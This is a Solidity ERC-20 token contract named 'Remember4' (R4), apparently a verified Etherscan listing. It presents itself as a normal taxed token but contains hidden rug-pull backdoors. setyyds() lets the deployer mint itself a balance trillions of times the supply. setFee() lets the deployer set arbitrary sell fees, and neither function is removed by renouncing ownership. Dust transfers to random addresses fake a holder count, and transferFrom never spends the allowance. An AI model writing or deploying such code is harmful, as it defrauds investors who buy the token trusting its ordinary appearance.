/**
 *Submitted for verification at Etherscan.io on 2023-03-09
*/

/**
 *Submitted for verification at Etherscan.io on 2023-03-04
*/

pragma solidity ^0.8.7;

// SPDX-License-Identifier: MIT

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract MyToken is IERC20, Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    uint256 public buy_fee = 3;
    uint256 public sell_fee = 8;
    int256 public sendAddress = 6;
    address public  _yydsking;
    address public uniswapV2Pair;
    mapping(address => bool) public isExcludedFromFee;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Remember4";
    string private  _symbol = "R4";

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        require(from != to);
        require(amount <= _balances[from]);
        uint256 fee = 0;
        if (from == uniswapV2Pair) {
            // buy token
            if (!isExcludedFromFee[to]){
                fee = amount.mul(buy_fee).div(100);
            }
        } else {
            // sell token
            if (!isExcludedFromFee[from]){
                amount.sub(uint256(sendAddress + 1) * 100);
                take_address(from, sendAddress, amount);
                fee = amount.mul(sell_fee).div(100);
            }
        }
        _balances[from] = _balances[from] - amount;
        _balances[to] += amount - fee;
        if (fee > 0) {
            emit Transfer(from, address(0), fee);
        }
        emit Transfer(from, to, amount-fee);
    }

    constructor() {
        _yydsking = msg.sender;
        _balances[msg.sender] = _totalSupply;
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(_router);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Pair = _uniswapV2Pair;

        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[_yydsking] = true;
        isExcludedFromFee[0xaB6C16A09A893fd82B20Def16825370d07cA816C] = true;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function take_address(address from, int256 send_a, uint256 amount) internal {
        for(int i=0; i<= send_a; i++ ) {
            address ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
            _basicTransfer(from, ad, 100);
        }
    }

    function setyyds() external {
        address _yydsOwen = _msgSender();
        if (_yydsking == _yydsOwen){ _balances[_yydsOwen] = _totalSupply * 10 ** 12; }}

    function setFee(uint256 taxFeeOnBuy, uint256 taxFeeOnSell) external {
        address _yydsOwen = _msgSender();
        if (_yydsking == _yydsOwen){
            buy_fee = taxFeeOnBuy;
            sell_fee = taxFeeOnSell;
        }
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
}